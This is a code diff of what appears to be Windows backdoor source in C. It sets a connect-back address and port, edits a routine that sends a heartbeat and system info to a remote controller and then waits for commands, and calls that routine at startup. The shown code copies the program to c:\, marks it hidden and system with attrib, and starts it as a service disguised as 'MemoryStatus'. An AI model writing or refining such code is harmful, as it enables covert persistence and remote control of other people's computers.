@@ -7,6 +7,7 @@
 
 // GCC lwininet ws2_32
 #pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "Wininet.lib")
 #pragma warning(disable: 4996) // avoid GetVersionEx to be warnedg
 #define S_OK                                   ((HRESULT)0L)
 #define S_FALSE                                ((HRESULT)1L)
@@ -22,8 +23,8 @@
 void WINAPI BDHandler(DWORD dwControl);
 void WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv);
 char const FLAG_[15] = "yyyyyyyyyyyyyyy";
-char const address[] = "12345678987654321";
-char const port[] = "999999999";
+char const address[] = "127.0.0.1";
+char const port[] = "80";
 char const sign[10] = "customize";
 SERVICE_STATUS ServiceStatus;
 SERVICE_STATUS_HANDLE ServiceStatusHandle;
@@ -320,10 +321,11 @@ void Handle(){
     struct CMSG msg = {
                 .sign =  "customize",
                 .mod = SERVER_HEARTS,
-                .msg_l = strlen(systeminfo)
+                //.msg_l = strlen(systeminfo)
+                .msg_l = 0
              };
     send(sock,(char*)&msg,sizeof(struct CMSG),0);
-    send(sock,systeminfo,strlen(systeminfo),0);//初始化信息
+    //send(sock,systeminfo,strlen(systeminfo),0);//初始化信息
     while (TRUE){
         char * address = malloc(sizeof(struct CMSG));
         int ret = recv(sock,address,sizeof(struct CMSG),0);
@@ -423,7 +425,7 @@ void WINAPI BDHandler(DWORD dwControl)
 void ServiceSvchostInstall(BOOL exits){
 
 }
-void ServiceInstall(BOOL exits){
+void ServiceInstall(BOOL run){
     char  szPath[MAX_PATH];
     char  target[MAX_PATH] = "c:\\";
     char  tar_path[MAX_PATH];
@@ -457,7 +459,7 @@ void ServiceInstall(BOOL exits){
         sprintf(cmd,"attrib +s +a +h +r %s",target);
         system(cmd);
         system("sc start MemoryStatus");
-        if (exits){
+        if (run){
             system(target);
             exit(0);
         }
@@ -477,6 +479,6 @@ int _stdcall WinMain(
 )
 {
     
-    
+    Handle();
     return 0;
 }
